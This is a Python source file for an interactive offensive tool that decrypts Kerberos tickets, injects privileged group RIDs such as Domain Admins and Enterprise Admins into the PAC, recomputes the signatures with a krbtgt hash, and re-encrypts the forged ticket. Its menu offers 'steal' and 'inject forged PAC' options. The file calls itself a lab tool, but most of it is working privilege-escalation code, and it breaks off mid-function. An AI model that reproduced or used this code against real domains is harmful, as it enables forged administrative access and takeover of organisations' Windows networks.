#!/usr/bin/env python3
"""
╔════════════════════════════════════════════════════════════════╗
║                P A C   M A N I P U L A T O R                   ║
║     Kerberos Ticket Manipulation & Privilege Escalation        ║
╚════════════════════════════════════════════════════════════════╝

"""

import sys
import os
import struct
import hmac
import hashlib
import argparse
import binascii
import copy
import socket
import time
from datetime import datetime
from typing import List, Optional

# ── Colors ────────────────────────────────────────────────────────────────────
R   = "\033[91m"; G   = "\033[92m"; Y   = "\033[93m"
B   = "\033[94m"; C   = "\033[96m"; W   = "\033[97m"
M   = "\033[95m"; BO  = "\033[1m";  DIM = "\033[2m"; RS  = "\033[0m"

def ok(m):   print(f"  {G}[+]{RS} {m}")
def info(m): print(f"  {B}[*]{RS} {m}")
def warn(m): print(f"  {Y}[~]{RS} {m}")
def err(m):  print(f"  {R}[!]{RS} {m}")
def sec(t):
    print(f"\n{M}{BO}[ {t} ]{RS}")
    print(f"{DIM}{'─'*60}{RS}")

def prompt(t):
    try:
        return input(f"  {C}[?]{RS} {t}")
    except (KeyboardInterrupt, EOFError):
        print(f"\n  {Y}[~] Interrupted{RS}")
        sys.exit(0)

def banner():
    return f"""
{M}{BO}╔════════════════════════════════════════════════════════════════╗
║                P A C   M A N I P U L A T O R                   ║
║     Kerberos Ticket Manipulation & Privilege Escalation        ║
╚════════════════════════════════════════════════════════════════╝{RS}
"""

# ── impacket detection (best method) ─────────────────────────────────────────
HAS_IMPACKET = False
IMPACKET_VER = "unknown"
IMPORT_ERROR = ""

PAC_LOGON_INFO         = 1
PAC_CREDENTIALS_INFO   = 2
PAC_SERVER_CHECKSUM    = 6
PAC_PRIVSVR_CHECKSUM   = 7
PAC_CLIENT_INFO        = 10
PAC_DELEGATION_INFO    = 11
PAC_UPN_DNS_INFO       = 12
PAC_ATTRIBUTES_INFO    = 17
PAC_REQUESTOR_INFO     = 18

def _check_impacket():
    """Best-effort impacket detection with detailed error reporting."""
    global HAS_IMPACKET, IMPACKET_VER, IMPORT_ERROR
    try:
        import impacket
        try:
            IMPACKET_VER = impacket.__version__
        except AttributeError:
            IMPACKET_VER = "installed (version unknown)"

        from impacket.krb5 import crypto, constants
        from impacket.krb5.asn1 import TGS_REP, EncTGSRepPart, AD_IF_RELEVANT, KRB_CRED, EncKDCRepPart
        from impacket.krb5.crypto import Key, _enctype_table
        from impacket.krb5.pac import PACTYPE, PAC_INFO_BUFFER, KERB_VALIDATION_INFO, \
            PAC_SIGNATURE_DATA, PKERB_VALIDATION_INFO, DOMAIN_GROUP_MEMBERSHIP
        from impacket.dcerpc.v5.rpcrt import TypeSerialization1
        from pyasn1.codec.ber import decoder, encoder
        HAS_IMPACKET = True
    except ImportError as e:
        HAS_IMPACKET = False
        IMPORT_ERROR = str(e)
    except Exception as e:
        HAS_IMPACKET = False
        IMPORT_ERROR = f"Unexpected error loading impacket: {e}"

_check_impacket()

# ── Lab Config (NO hardcoded IP or domain) ────────────────────────────────────
LAB_DEFAULTS = {
    "domain":      None,       # Will be prompted
    "domain_upper": None,      # Derived from domain
    "dc_ip":       None,       # Will be prompted
    "dc_name":     None,       # Will be prompted
    "domain_sid":  None,       # Will be prompted
    "krbtgt_hash": None,       # Will be prompted
    "groups": {
        "Domain Admins":     512,
        "Domain Users":      513,
        "Enterprise Admins": 519,
        "Schema Admins":     518,
        "Group Policy Creator Owners": 520,
        "DNS Admins":        1101,
        "Exchange Services": 1316,
    }
}

# ── Helpers ─────────────────────────────────────────────────────────────────
def hex_to_bytes(hex_str: str) -> bytes:
    cleaned = hex_str.replace(':', '').replace(' ', '').strip()
    if len(cleaned) % 2:
        cleaned = '0' + cleaned
    return binascii.unhexlify(cleaned)

def bytes_to_hex(data: bytes) -> str:
    return binascii.hexlify(data).decode()

def rid_to_full_sid(rid: int, domain_sid: str = None) -> str:
    sid = domain_sid or LAB_DEFAULTS['domain_sid']
    return f"{sid}-{rid}"

def get_checksum_type_for_enctype(enctype: int) -> int:
    mapping = {1: 1, 3: 3, 17: 15, 18: 16, 23: 10}
    return mapping.get(enctype, 16)

def calc_pac_checksum(data: bytes, key: bytes, signature_type: int = 16) -> bytes:
    if signature_type in (16, 15):
        return hmac.new(key, data, hashlib.sha1).digest()[:12]
    elif signature_type == 10:
        return hmac.new(key, data, hashlib.md5).digest()
    elif signature_type == 12:
        return hmac.new(key, data, hashlib.sha384).digest()[:24]
    else:
        return hmac.new(key, data, hashlib.sha1).digest()[:12]

def validate_ip_address(ip: str) -> bool:
    """Validate IP address format."""
    parts = ip.split('.')
    if len(parts) != 4:
        return False
    for part in parts:
        if not part.isdigit():
            return False
        num = int(part)
        if num < 0 or num > 255:
            return False
    return True

def test_dc_connectivity(dc_ip: str, port: int = 88, timeout: int = 3) -> bool:
    """Test connectivity to DC on Kerberos port (88) using best practices."""
    try:
        with socket.create_connection((dc_ip, port), timeout=timeout) as sock:
            return True
    except (socket.timeout, OSError, ConnectionRefusedError):
        return False
    except Exception:
        return False
def prompt_for_lab_config() -> dict:
    """
    Prompt user for lab configuration with validation and connectivity testing.
    Allows 3 connection attempts before auto-exiting (exits immediately on failure).
    """
    config = dict(LAB_DEFAULTS)

    sec("LAB SETUP — NO HARDCODED VALUES")
    print(f"  {DIM}Please provide your lab environment details.{RS}")
    print(f"  {DIM}Example: IP = 192.168.1.10, Domain = evil.corp{RS}\n")

    # ── Domain ──
    while True:
        domain = prompt("Domain (e.g., evil.corp): ").strip().lower()
        if domain and '.' in domain:
            config['domain'] = domain
            config['domain_upper'] = domain.upper()
            break
        err("Invalid domain. Example: evil.corp, cs.org, lab.local")

    # ── DC IP ──
    while True:
        dc_ip = prompt("DC IP (e.g., 192.168.1.10): ").strip()
        if validate_ip_address(dc_ip):
            config['dc_ip'] = dc_ip
            break
        err("Invalid IP format. Example: 192.168.1.10, 10.0.0.5")

    # ── DC Name ──
    dc_name = prompt(f"DC hostname [DC01]: ").strip()
    config['dc_name'] = dc_name if dc_name else "DC01"

    # ── Domain SID ──
    while True:
        domain_sid = prompt("Domain SID (e.g., S-1-5-21-...): ").strip()
        if domain_sid.startswith("S-1-5-21-"):
            config['domain_sid'] = domain_sid
            break
        err("Invalid SID format. Example: S-1-5-21-2167545187-3641254390-1122056181")

    # ── krbtgt hash ──
    while True:
        krbtgt = prompt("krbtgt NT hash (32 hex chars): ").strip().replace(':', '').replace(' ', '')
        if len(krbtgt) == 32 and all(c in '0123456789abcdefABCDEF' for c in krbtgt):
            config['krbtgt_hash'] = krbtgt.lower()
            break
        err("Invalid hash. Must be 32 hexadecimal characters. Example: aabbccdd11223344556677889900aabb")

    # ── Connectivity Test (3 attempts, auto-exit on failure) ──
    sec("CONNECTIVITY TEST")
    info(f"Testing reachability to {config['dc_ip']}:88 (Kerberos)...")

    max_attempts = 3
    for attempt in range(1, max_attempts + 1):
        info(f"Attempt {attempt}/{max_attempts}...")
        if test_dc_connectivity(config['dc_ip'], port=88, timeout=3):
            ok(f"DC {config['dc_ip']} is reachable on port 88!")
            break
        else:
            warn(f"Cannot connect to {config['dc_ip']}:88")
            if attempt < max_attempts:
                info("Retrying in 2 seconds...")
                time.sleep(2)
            else:
                err(f"Failed to connect after {max_attempts} attempts.")
                err("Please verify:")
                print(f"    {W}• DC IP is correct and DC is online{RS}")
                print(f"    {W}• Firewall allows port 88/tcp{RS}")
                print(f"    {W}• You are on the same network segment{RS}")
                print(f"\n  {R}{BO}Exiting.{RS}")
                sys.exit(1)

    ok("Lab configuration validated successfully!")
    return config


# ── Fallback PAC Parser ─────────────────────────────────────────────────────

class FallbackPACStruct:
    def __init__(self, data: bytes = None):
        self.cBuffers = 0
        self.buffers = []
        if data:
            self.parse(data)

    def parse(self, data: bytes):
        offset = 0
        self.cBuffers = struct.unpack('<I', data[offset:offset+4])[0]
        offset += 4
        _ = struct.unpack('<I', data[offset:offset+4])[0]
        offset += 4
        headers = []
        for i in range(self.cBuffers):
            buf_type = struct.unpack('<I', data[offset:offset+4])[0]
            buf_size = struct.unpack('<I', data[offset+4:offset+8])[0]
            buf_offset = struct.unpack('<Q', data[offset+8:offset+16])[0]
            headers.append((buf_type, buf_size, buf_offset))
            offset += 16
        for buf_type, buf_size, buf_offset in headers:
            buf_data = data[buf_offset:buf_offset+buf_size]
            self.buffers.append({'type': buf_type, 'size': buf_size, 'offset': buf_offset, 'data': buf_data})

    def build(self) -> bytes:
        header_size = 8 + (len(self.buffers) * 16)
        offset = header_size
        for buf in self.buffers:
            buf['size'] = len(buf['data'])
            buf['offset'] = offset
            offset += len(buf['data'])
            if offset % 8:
                offset += 8 - (offset % 8)
        data = struct.pack('<II', len(self.buffers), 0)
        for buf in self.buffers:
            data += struct.pack('<IIQ', buf['type'], buf['size'], buf['offset'])
        for buf in self.buffers:
            data += buf['data']
            while len(data) % 8:
                data += b'\x00'
        return data

    def find_buffer(self, buf_type: int) -> Optional[dict]:
        for buf in self.buffers:
            if buf['type'] == buf_type:
                return buf
        return None

    def add_or_replace_buffer(self, buf_type: int, data: bytes):
        for i, buf in enumerate(self.buffers):
            if buf['type'] == buf_type:
                self.buffers[i]['data'] = data
                return
        self.buffers.append({'type': buf_type, 'data': data})


class FallbackGroupMembership:
    def __init__(self, rid=0, attrs=0x00000007):
        self.RelativeId = rid
        self.Attributes = attrs
    def pack(self) -> bytes:
        return struct.pack('<II', self.RelativeId, self.Attributes)


class FallbackKERBValidationInfo:
    def __init__(self):
        self.LogonTime = 0; self.LogoffTime = 0; self.KickOffTime = 0
        self.PasswordLastSet = 0; self.PasswordCanChange = 0; self.PasswordMustChange = 0
        self.LogonCount = 0; self.BadPasswordCount = 0
        self.UserId = 0; self.PrimaryGroupId = 513; self.GroupCount = 0
        self.GroupIds = []; self.UserFlags = 0
        self.UserSessionKey = b'\x00' * 16
        self.LogonServer = ""; self.LogonDomainName = ""; self.LogonDomainId = None
        self.UserAccountControl = 0; self.SidCount = 0; self.ExtraSids = []
        self.ResourceGroupDomainSid = None; self.ResourceGroupCount = 0; self.ResourceGroupIds = []

    def parse(self, data: bytes):
        try:
            self.LogonTime = struct.unpack('<Q', data[16:24])[0]
            self.LogoffTime = struct.unpack('<Q', data[24:32])[0]
            self.UserId = struct.unpack('<I', data[56:60])[0]
            self.PrimaryGroupId = struct.unpack('<I', data[60:64])[0]
            self.GroupCount = struct.unpack('<I', data[64:68])[0]
            self._find_and_parse_groups(data)
        except Exception as e:
            warn(f"Fallback parser heuristic failed: {e}")

    def _find_and_parse_groups(self, data: bytes):
        self.GroupIds = []
        i = 0
        while i < len(data) - 8:
            try:
                rid, attrs = struct.unpack('<II', data[i:i+8])
                if 500 <= rid <= 65535 and attrs in (0x00000007, 0x0000000F, 0x80000007):
                    self.GroupIds.append(FallbackGroupMembership(rid, attrs))
                    if len(self.GroupIds) >= self.GroupCount:
                        break
            except:
                pass
            i += 4

    def add_group(self, rid: int) -> bool:
        for g in self.GroupIds:
            if g.RelativeId == rid:
                warn(f"Group RID {rid} already present")
                return False
        self.GroupIds.append(FallbackGroupMembership(rid))
        self.GroupCount = len(self.GroupIds)
        return True

    def build(self) -> bytes:
        data = struct.pack('<Q', self.LogonTime)
        data += struct.pack('<Q', self.LogoffTime)
        data += struct.pack('<Q', self.KickOffTime)
        data += struct.pack('<Q', self.PasswordLastSet)
        data += struct.pack('<Q', self.PasswordCanChange)
        data += struct.pack('<Q', self.PasswordMustChange)
        data += b'\x00' * 16
        data += struct.pack('<H', self.LogonCount)
        data += struct.pack('<H', self.BadPasswordCount)
        data += struct.pack('<I', self.UserId)
        data += struct.pack('<I', self.PrimaryGroupId)
        data += struct.pack('<I', self.GroupCount)
        for g in self.GroupIds:
            data += g.pack()
        while len(data) < 256:
            data += b'\x00'
        return data


# ── PAC Manipulator ─────────────────────────────────────────────────────────

class PACManipulator:
    def __init__(self, domain_sid: str = None, krbtgt_hash: str = None):
        self.domain_sid = domain_sid or LAB_DEFAULTS['domain_sid']
        self.krbtgt_hash = krbtgt_hash or LAB_DEFAULTS['krbtgt_hash']
        self.pac_data = None
        self.buffers = []
        self.validation_info = None
        self.uses_impacket = HAS_IMPACKET

    def parse_pac(self, pac_bytes: bytes) -> bool:
        self.pac_data = pac_bytes
        if self.uses_impacket:
            try:
                pac_type = PACTYPE(pac_bytes)
                self.buffers = []
                for buffer_info in pac_type['Buffers']:
                    self.buffers.append({'type': buffer_info['ulType'], 'data': buffer_info['Data'], 'info': buffer_info})
                ok(f"PAC parsed with impacket: {len(self.buffers)} buffers")
                return True
            except Exception as e:
                warn(f"Impacket PAC parse failed, trying fallback: {e}")
                self.uses_impacket = False
        try:
            pac = FallbackPACStruct(pac_bytes)
            self.buffers = pac.buffers
            ok(f"PAC parsed with fallback: {len(self.buffers)} buffers")
            return True
        except Exception as e:
            err(f"PAC parsing failed: {e}")
            return False

    def extract_validation_info(self) -> bool:
        logon_buf = None
        for buf in self.buffers:
            if buf['type'] == PAC_LOGON_INFO:
                logon_buf = buf
                break
        if not logon_buf:
            err("LOGON_INFO buffer (type 1) not found")
            return False
        info(f"Found LOGON_INFO buffer ({len(logon_buf['data'])} bytes)")
        if self.uses_impacket:
            try:
                from io import BytesIO
                stream = BytesIO(logon_buf['data'])
                version = struct.unpack('<I', stream.read(4))[0]
                info(f"TypeSerialization version: {version}")
                ndr_data = stream.read()
                val_info = KERB_VALIDATION_INFO()
                val_info.fromString(ndr_data)
                self.validation_info = val_info
                return True
            except Exception as e:
                warn(f"Impacket NDR parse failed, trying fallback: {e}")
                self.uses_impacket = False
        try:
            val_info = FallbackKERBValidationInfo()
            val_info.parse(logon_buf['data'])
            self.validation_info = val_info
            return True
        except Exception as e:
            err(f"Validation info extraction failed: {e}")
            return False

    def show_current_groups(self):
        if not self.validation_info:
            err("No validation info loaded")
            return
        if self.uses_impacket:
            user_id = self.validation_info['UserId']
            primary_group = self.validation_info['PrimaryGroupId']
            group_count = self.validation_info['GroupCount']
            groups = self.validation_info['GroupIds'] or []
            extra_sids = self.validation_info.get('ExtraSids', [])
            sid_count = self.validation_info.get('SidCount', 0)
        else:
            user_id = self.validation_info.UserId
            primary_group = self.validation_info.PrimaryGroupId
            group_count = self.validation_info.GroupCount
            groups = self.validation_info.GroupIds
            extra_sids = self.validation_info.ExtraSids
            sid_count = self.validation_info.SidCount
        print(f"\n  {BO}Current User RID:{RS} {W}{user_id}{RS}")
        print(f"  {BO}Primary Group:{RS} {W}{primary_group}{RS}")
        print(f"\n  {BO}Group Memberships ({group_count} groups):{RS}")
        if groups:
            for i, group in enumerate(groups):
                if self.uses_impacket:
                    rid = group['RelativeId']
                    attrs = group['Attributes']
                else:
                    rid = group.RelativeId
                    attrs = group.Attributes
                sid = rid_to_full_sid(rid, self.domain_sid)
                print(f"    {DIM}[{i:2d}]{RS} RID: {W}{rid:<6}{RS}  SID: {C}{sid}{RS}  Attrs: 0x{attrs:08x}")
        else:
            print(f"    {DIM}(no groups found){RS}")
        if sid_count > 0 and extra_sids:
            print(f"\n  {BO}Extra SIDs ({sid_count}):{RS}")
            for sid_info in extra_sids:
                if self.uses_impacket:
                    sid_str = str(sid_info['Sid'])
                    attrs = sid_info['Attributes']
                else:
                    sid_str = str(sid_info)
                    attrs = 0
                print(f"    {C}{sid_str}{RS}  Attrs: 0x{attrs:08x}")

    def add_groups(self, rids: List[int]) -> int:
        if not self.validation_info:
            err("No validation info loaded")
            return 0
        added = 0
        existing_rids = set()
        if self.uses_impacket:
            groups = self.validation_info['GroupIds'] or []
            for g in groups:
                existing_rids.add(g['RelativeId'])
            for rid in rids:
                if rid in existing_rids:
                    warn(f"Group RID {rid} already present, skipping")
                    continue
                new_group = DOMAIN_GROUP_MEMBERSHIP()
                new_group['RelativeId'] = rid
                new_group['Attributes'] = 0x00000007
                if self.validation_info['GroupIds'] is None:
                    self.validation_info['GroupIds'] = []
                self.validation_info['GroupIds'].append(new_group)
                existing_rids.add(rid)
                sid = rid_to_full_sid(rid, self.domain_sid)
                ok(f"Added RID {rid} ({sid})")
                added += 1
            self.validation_info['GroupCount'] = len(self.validation_info['GroupIds'])
        else:
            for g in self.validation_info.GroupIds:
                existing_rids.add(g.RelativeId)
            for rid in rids:
                if rid in existing_rids:
                    warn(f"Group RID {rid} already present, skipping")
                    continue
                if self.validation_info.add_group(rid):
                    sid = rid_to_full_sid(rid, self.domain_sid)
                    ok(f"Added RID {rid} ({sid})")
                    added += 1
        info(f"Total groups: {self.validation_info['GroupCount'] if self.uses_impacket else self.validation_info.GroupCount}")
        return added

    def rebuild_logon_buffer(self) -> bytes:
        if self.uses_impacket:
            try:
                ts1 = TypeSerialization1(self.validation_info)
                return ts1.getData()
            except Exception as e:
                warn(f"TypeSerialization1 failed, using raw NDR: {e}")
                try:
                    return self.validation_info.getData()
                except:
                    pass
        return self.validation_info.build()

    def build_modified_pac(self, server_key: bytes, krbtgt_key: bytes, enctype: int = 18) -> Optional[bytes]:
        try:
            for i, buf in enumerate(self.buffers):
                if buf['type'] == PAC_LOGON_INFO:
                    new_data = self.rebuild_logon_buffer()
                    self.buffers[i]['data'] = new_data
                    if self.uses_impacket and 'info' in buf:
                        self.buffers[i]['info']['Data'] = new_data
                    info(f"LOGON_INFO rebuilt ({len(new_data)} bytes)")
                    break
            sig_type = get_checksum_type_for_enctype(enctype)
            sig_len = 12 if sig_type in (15, 16) else 16
            temp_pac = FallbackPACStruct()
            temp_pac.cBuffers = 0
            temp_pac.buffers = []
            for buf in self.buffers:
                if buf['type'] in (PAC_SERVER_CHECKSUM, PAC_PRIVSVR_CHECKSUM):
                    zeroed_sig = struct.pack('<I', sig_type) + b'\x00' * sig_len
                    temp_pac.buffers.append({'type': buf['type'], 'data': zeroed_sig})
                else:
                    temp_pac.buffers.append({'type': buf['type'], 'data': buf['data']})
            temp_pac.cBuffers = len(temp_pac.buffers)
            pac_data_for_signing = temp_pac.build()
            server_sig = calc_pac_checksum(pac_data_for_signing, server_key, sig_type)
            server_cs_data = struct.pack('<I', sig_type) + server_sig
            privsvr_sig = calc_pac_checksum(server_sig, krbtgt_key, sig_type)
            privsvr_cs_data = struct.pack('<I', sig_type) + privsvr_sig
            has_server = False
            has_priv = False
            for i, buf in enumerate(self.buffers):
                if buf['type'] == PAC_SERVER_CHECKSUM:
                    self.buffers[i]['data'] = server_cs_data
                    has_server = True
                elif buf['type'] == PAC_PRIVSVR_CHECKSUM:
                    self.buffers[i]['data'] = privsvr_cs_data
                    has_priv = True
            if not has_server:
                self.buffers.append({'type': PAC_SERVER_CHECKSUM, 'data': server_cs_data})
            if not has_priv:
                self.buffers.append({'type': PAC_PRIVSVR_CHECKSUM, 'data': privsvr_cs_data})
            final_pac = FallbackPACStruct()
            final_pac.cBuffers = len(self.buffers)
            final_pac.buffers = self.buffers
            result = final_pac.build()
            ok(f"PAC rebuilt: {len(result)} bytes")
            ok("SERVER_CHECKSUM recalculated")
            ok("PRIVSVR_CHECKSUM recalculated")
            return result
        except Exception as e:
            err(f"PAC rebuild failed: {e}")
            import traceback
            traceback.print_exc()
            return None


# ── Ticket Manipulator ──────────────────────────────────────────────────────

class TicketManipulator:
    def __init__(self, domain_sid: str = None, krbtgt_hash: str = None):
        self.domain_sid = domain_sid or LAB_DEFAULTS['domain_sid']
        self.krbtgt_hash = krbtgt_hash or LAB_DEFAULTS['krbtgt_hash']
        self.pac_manipulator = PACManipulator(self.domain_sid, self.krbtgt_hash)

    def decrypt_ticket(self, ticket_data: bytes, session_key: bytes) -> Optional[dict]:
        if not HAS_IMPACKET:
            err("impacket required for ticket decryption")
            return None
        try:
            # Try KRB_CRED format first (Mimikatz .kirbi files)
            try:
                krb_cred = decoder.decode(ticket_data, asn1Spec=KRB_CRED())[0]
                info("Ticket format: KRB_CRED (Mimikatz .kirbi)")
                # KRB_CRED contains tickets and enc-part
                tickets = krb_cred['tickets']
                enc_part = krb_cred['enc-part']
                enctype = int(enc_part['etype'])
                info(f"Ticket encryption type: {enctype} ({constants.EncryptionTypes(enctype).name})")
                key = Key(enctype, session_key)
                cipher = _enctype_table[enctype]
                cipher_text = bytes(enc_part['cipher'])
                # Key usage 14 = KRB_CRED encrypted part
                plain_text = cipher.decrypt(key, 14, cipher_text)
                # Decode as Sequence (KrbCredInfo)
                from pyasn1.type.univ import Sequence
                enc_data = decoder.decode(plain_text, asn1Spec=Sequence())[0]
                ok(f"Ticket decrypted ({len(plain_text)} bytes)")
                return {'krb_cred': krb_cred, 'enc_data': enc_data, 'enctype': enctype,
                        'session_key': session_key, 'key': key, 'cipher': cipher, 'format': 'KRB_CRED'}
            except Exception as krb_cred_err:
                # Try TGS_REP format
                info("Ticket format: TGS_REP")
                tgs = decoder.decode(ticket_data, asn1Spec=TGS_REP())[0]
                enc_part = tgs['enc-part']
                enctype = int(enc_part['etype'])
                info(f"Ticket encryption type: {enctype} ({constants.EncryptionTypes(enctype).name})")
                key = Key(enctype, session_key)
                cipher = _enctype_table[enctype]
                cipher_text = bytes(enc_part['cipher'])
                plain_text = cipher.decrypt(key, 3, cipher_text)
                enc_data = decoder.decode(plain_text, asn1Spec=EncTGSRepPart())[0]
                ok(f"Ticket decrypted ({len(plain_text)} bytes)")
                return {'tgs': tgs, 'enc_data': enc_data, 'enctype': enctype,
                        'session_key': session_key, 'key': key, 'cipher': cipher, 'format': 'TGS_REP'}
        except Exception as e:
            err(f"Decryption failed: {e}")
            import traceback
            traceback.print_exc()
            return None

    def extract_pac(self, decrypted: dict) -> bool:
        try:
            enc_data = decrypted['enc_data']

            # Handle KRB_CRED format (Mimikatz .kirbi)
            if decrypted.get('format') == 'KRB_CRED':
                # In KRB_CRED, the enc_data is a Sequence containing KrbCredInfo
                # The authorization-data is in the ticket itself, not the encrypted part
                # We need to look in the ticket's authorization-data
                krb_cred = decrypted['krb_cred']
                tickets = krb_cred['tickets']
                for ticket in tickets:
                    # Try to find PAC in the ticket's authorization-data
                    # This is a simplified approach - full KRB_CRED parsing is complex
                    # For now, try to extract from the decrypted part
                    pass
                err("KRB_CRED PAC extraction not fully implemented yet")
                info("The .kirbi file format requires additional parsing")
                return False

            # Handle TGS_REP format
            auth_data = enc_data['authorization-data']
            for ad in auth_data:
                if int(ad['ad-type']) == 128:
                    pac_data = bytes(ad['ad-data'])
                    ok(f"PAC found: {len(pac_data)} bytes")
                    return self.pac_manipulator.parse_pac(pac_data)
            for ad in auth_data:
                if int(ad['ad-type']) == 1:
                    inner_data = bytes(ad['ad-data'])
                    inner_ads = decoder.decode(inner_data, asn1Spec=AD_IF_RELEVANT())[0]
                    for inner_ad in inner_ads:
                        if int(inner_ad['ad-type']) == 128:
                            pac_data = bytes(inner_ad['ad-data'])
                            ok(f"PAC found (wrapped): {len(pac_data)} bytes")
                            return self.pac_manipulator.parse_pac(pac_data)
            err("No PAC (type 128) found in authorization-data")
            return False
        except Exception as e:
            err(f"PAC extraction failed: {e}")
            import traceback
            traceback.print_exc()
            return False

    def show_pac_buffers(self):
        print(f"\n  {BO}PAC Buffers:{RS}")
        for buf in self.pac_manipulator.buffers:
            buf_name = {1: "LOGON_INFO", 2: "CREDENTIALS", 6: "SERVER_CHECKSUM", 7: "PRIVSVR_CHECKSUM",
                        10: "CLIENT_INFO", 11: "DELEGATION", 12: "UPN_DNS", 17: "ATTRIBUTES", 18: "REQUESTOR"}.get(
                buf['type'], f"UNKNOWN({buf['type']})")
            print(f"    {DIM}Type {buf['type']:2d}:{RS} {buf_name} ({len(buf['data'])} bytes)")

    def modify_groups(self, group_rids: List[int]) -> int:
        if not self.pac_manipulator.validation_info:
            if not self.pac_manipulator.extract_validation_info():
                return 0
        self.pac_manipulator.show_current_groups()
        return self.pac_manipulator.add_groups(group_rids)

    def rebuild_ticket(self, decrypted: dict, output_file: str, server_key: bytes = None, krbtgt_key: bytes = None) -> bool:
        try:
            enctype = decrypted['enctype']
            if server_key is None:
                server_key = hex_to_bytes(self.krbtgt_hash)
            if krbtgt_key is None:
                krbtgt_key = hex_to_bytes(self.krbtgt_hash)
            new_pac = self.pac_manipulator.build_modified_pac(server_key, krbtgt_key, enctype)
            if not new_pac:
                return False
            enc_data = decrypted['enc_data']
            pac_replaced = False
            for i in range(len(enc_data['authorization-data'])):
                if int(enc_data['authorization-data'][i]['ad-type']) == 128:
                    enc_data['authorization-data'][i]['ad-data'] = new_pac
                    pac_replaced = True
                    break
            if not pac_replaced:
                for i in range(len(enc_data['authorization-data'])):
                    if int(enc_data['authorization-data'][i]['ad-type']) == 1:
                        inner_data = bytes(enc_data['authorization-data'][i]['ad-data'])
                        inner_ads = decoder.decode(inner_data, asn1Spec=AD_IF_RELEVANT())[0]
                        for j in range(len(inner_ads)):
                            if int(inner_ads[j]['ad-type']) == 128:
                                inner_ads[j]['ad-data'] = new_pac
                                pac_replaced = True
                                break
                        if pac_replaced:
                            new_inner = encoder.encode(inner_ads)
                            enc_data['authorization-data'][i]['ad-data'] = new_inner
                            break
            if not pac_replaced:
                err("Could not replace PAC in authorization data")
                return False
            new_enc_data = encoder.encode(enc_data)
            key = decrypted['key']
            cipher = decrypted['cipher']
            encrypted = cipher.encrypt(key, 3, new_enc_data)
            tgs = decrypted['tgs']
            tgs['enc-part']['cipher'] = encrypted
            final_data = encoder.encode(tgs)
            with open(output_file, 'wb') as f:
                f.write(final_data)
            ok(f"Modified ticket saved: {output_file} ({len(final_data)} bytes)")
            return True
        except Exception as e:
            err(f"Re-encryption failed: {e}")
            import traceback
            traceback.print_exc()
            return False


# ── Interactive Menu ────────────────────────────────────────────────────────

class InteractiveMenu:
    def __init__(self):
        self.config = prompt_for_lab_config()
        self.config['ticket_file'] = None
        self.config['session_key'] = None
        self.ticket_manipulator = None
        self.decrypted_ticket = None

    def show_banner(self):
        print(banner())
        if HAS_IMPACKET:
            print(f"  {G}impacket {IMPACKET_VER} loaded{RS}\n")
        else:
            print(f"  {R}{BO}WARNING:{RS} impacket not found. Full features disabled.\n")
            print(f"  {W}Python: {sys.executable}{RS}")
            print(f"  {W}Error: {IMPORT_ERROR}{RS}\n")

    def show_menu(self):
        print(f"""
  {BO}┌──────────────────────────────────────────────────────────┐
  │            PAC MANIPULATION MENU                         │
  ├──────────────────────────────────────────────────────────┤
  │ [1] steal      — Dump & modify existing ticket           │
  │ [2] inject     — Inject forged PAC (requires krbtgt)     │
  │ [3] modify     — Modify PAC groups directly              │
  │ [4] info       — Show lab configuration                  │
  │ [0] exit                                                   │
  └──────────────────────────────────────────────────────────┘{RS}
""")
        if not HAS_IMPACKET:
            print(f"  {Y}[~] Options [1] and [3] require impacket for decryption{RS}")
            print(f"  {Y}[~] Option [2] may work with limited functionality{RS}\n")

    def show_info(self):
        sec("LAB CONFIGURATION")
        print(f"  Domain:      {W}{self.config['domain']}{RS}")
        print(f"  DC IP:       {W}{self.config['dc_ip']}{RS}")
        print(f"  DC Name:     {W}{self.config['dc_name']}{RS}")
        print(f"  Domain SID:  {W}{self.config['domain_sid']}{RS}")
        print(f"  krbtgt hash: {W}{self.config['krbtgt_hash']}{RS}")
        print(f"\n  {BO}Key Groups (RIDs):{RS}")
        for name, rid in self.config['groups'].items():
            print(f"    {W}{rid:<6}{RS} = {name}")
        print()

    def configure_lab(self):
        sec("LAB CONFIGURATION")
        print(f"  Press ENTER to keep current value\n")
        self.config['domain'] = prompt(f"Domain [{self.config['domain']}]: ").strip() or self.config['domain']
        self.config['domain_upper'] = self.config['domain'].upper()
        self.config['dc_ip'] = prompt(f"DC IP [{self.config['dc_ip']}]: ").strip() or self.config['dc_ip']
        self.config['dc_name'] = prompt(f"DC Name [{self.config['dc_name']}]: ").strip() or self.config['dc_name']
        self.config['domain_sid'] = prompt(f"Domain SID [{self.config['domain_sid']}]: ").strip() or self.config['domain_sid']
        self.config['krbtgt_hash'] = prompt(f"krbtgt hash [{self.config['krbtgt_hash']}]: ").strip() or self.config['krbtgt_hash']
        ok("Lab configuration updated")

    def select_groups(self) -> List[int]:
        print(f"\n  {BO}Available Groups:{RS}")
        groups = list(self.config['groups'].items())
        for i, (name, rid) in enumerate(groups, 1):
            print(f"    [{i}] {name} (RID {rid})")
        print(f"    [0] Custom RID")
        selected = []
        while True:
            choice = prompt("Select group (comma-separated, or 'done'): ").strip()
            if choice.lower() in ('done', 'd', ''):
                break
            for item in choice.split(','):
                item = item.strip()
                if item.isdigit():
                    num = int(item)
                    if num == 0:
                        custom = prompt("Enter custom RID: ").strip()
                        if custom.isdigit():
                            selected.append(int(custom))
                            ok(f"Added custom RID {custom}")
                    elif 1 <= num <= len(groups):
                        rid = groups[num-1][1]
                        selected.append(rid)
                        ok(f"Added {groups[num-1][0]} (RID {rid})")
                    else:
                        warn(f"Invalid: {num}")
                else:
                    warn(f"Invalid: {item}")
        return selected

    def menu_steal(self):
        sec("STEAL & MODIFY TICKET")
        if not HAS_IMPACKET:
            err("impacket is required for ticket decryption")
            print(f"\n  {BO}To fix:{RS}")
            print(f"  {W}{sys.executable} -m pip install impacket pyasn1 --break-system-packages{RS}\n")
            return
        ticket_file = prompt("Path to .kirbi ticket file: ").strip().strip('"').strip("'")
        if not ticket_file or not os.path.exists(ticket_file):
            err(f"File not found: {ticket_file}")
            return
        session_key_hex = prompt("Session key (hex): ").strip().replace(':', '').replace(' ', '')
        try:
            session_key = hex_to_bytes(session_key_hex)
        except Exception as e:
            err(f"Invalid session key: {e}")
            return
        krbtgt_hex = prompt(f"krbtgt hash [{self.config['krbtgt_hash']}]: ").strip()
        try:
            krbtgt_key = hex_to_bytes(krbtgt_hex.replace(':', '').replace(' ', '')) if krbtgt_hex else hex_to_bytes(self.config['krbtgt_hash'])
        except Exception as e:
            err(f"Invalid krbtgt hash: {e}")
            return
        group_rids = self.select_groups()
        if not group_rids:
            warn("No groups selected")
            return
        default_output = ticket_file + ".pac_modified"
